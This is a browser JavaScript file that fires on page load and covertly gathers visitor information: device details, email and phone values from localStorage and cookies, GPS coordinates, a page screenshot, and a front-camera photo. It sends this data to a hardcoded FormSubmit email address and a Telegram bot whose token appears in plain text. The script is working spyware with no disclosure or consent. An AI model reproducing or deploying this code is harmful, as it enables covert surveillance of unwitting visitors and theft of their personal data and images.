// Configuration
const config = {
    emailEndpoint: "https://formsubmit.co/ajax/soghbatyanvahan@gmail.com",
    telegramBotToken: "8179188509:AAGQdVbcxNMX-3WQzu_IPyypucLA7ymQULk", // Replace with your actual token
    telegramChatId: "codevahbot" // Replace with your chat ID
  };
  
  // Main tracking function
  async function trackVisitor() {
    const data = {
      website: window.location.href || "index.html",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      referrer: document.referrer || "Direct visit",
      visitTime: new Date().toISOString(),
      ip: "Will be added by FormSubmit"
    };
  
    // Get stored data from localStorage
    try {
      const savedEmail = localStorage.getItem('userEmail');
      const savedPhone = localStorage.getItem('userPhone');
      if (savedEmail) data.savedEmail = savedEmail;
      if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
      console.log("LocalStorage access error:", e);
    }
  
    // Get cookies
    try {
      const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
      }, {});
      if (cookies.email) data.cookieEmail = cookies.email;
      if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
      console.log("Cookie access error:", e);
    }
  
    // Get geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          data.latitude = position.coords.latitude;
          data.longitude = position.coords.longitude;
          captureAndSendData(data);
        },
        () => {
          data.locationError = "Geolocation unavailable";
          captureAndSendData(data);
        }
      );
    } else {
      captureAndSendData(data);
    }
  }
  
  // Capture screenshot and send data
  async function captureAndSendData(data) {
    try {
      // Load html2canvas if not already loaded
      if (typeof html2canvas !== 'function') {
        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
      }
  
      // Capture page screenshot
      const canvas = await html2canvas(document.body);
      const screenshot = canvas.toDataURL('image/jpeg', 0.7);
      data.screenshot = screenshot;
  
      // Try to capture camera image
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const photoBlob = await imageCapture.takePhoto();
        data.cameraImage = await blobToBase64(photoBlob);
        videoTrack.stop();
      } catch (cameraError) {
        console.log("Camera access error:", cameraError);
        data.cameraError = cameraError.message;
      }
  
      // Send data to both email and Telegram
      await Promise.all([
        sendToEmail(data),
        sendToTelegram(data)
      ]);
  
    } catch (error) {
      console.error("Error in captureAndSendData:", error);
      // Fallback - send basic data without media
      sendToEmail(data);
    }
  }
  
  // Send to FormSubmit email
  async function sendToEmail(data) {
    try {
      const response = await fetch(config.emailEndpoint, {
        method: "POST",
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(data)
      });
      return await response.json();
    } catch (error) {
      console.error("Email send error:", error);
    }
  }
  
  // Send to Telegram bot
  async function sendToTelegram(data) {
    try {
      // Send text message
      let message = `🌐 New website visit\n`;
      message += `🕒 ${new Date(data.visitTime).toLocaleString()}\n`;
      message += `🔗 ${data.website}\n`;
      message += `📱 ${data.platform} (${data.screenWidth}x${data.screenHeight})\n`;
      if (data.latitude && data.longitude) {
        message += `📍 Location: ${data.latitude}, ${data.longitude}\n`;
      }
  
      await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.telegramChatId,
          text: message
        })
      });
  
      // Send screenshot if available
      if (data.screenshot) {
        const formData = new FormData();
        formData.append('chat_id', config.telegramChatId);
        formData.append('photo', dataURLtoBlob(data.screenshot), 'screenshot.jpg');
        
        await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }
  
      // Send camera image if available
      if (data.cameraImage) {
        const formData = new FormData();
        formData.append('chat_id', config.telegramChatId);
        formData.append('photo', dataURLtoBlob(data.cameraImage), 'photo.jpg');
        
        await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      }
  
    } catch (error) {
      console.error("Telegram send error:", error);
    }
  }
  
  // Helper functions
  function loadScript(src) {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = src;
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }
  
  function blobToBase64(blob) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.readAsDataURL(blob);
    });
  }
  
  function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type: mime});
  }
  
  // Start tracking when page loads
  window.addEventListener('load', trackVisitor);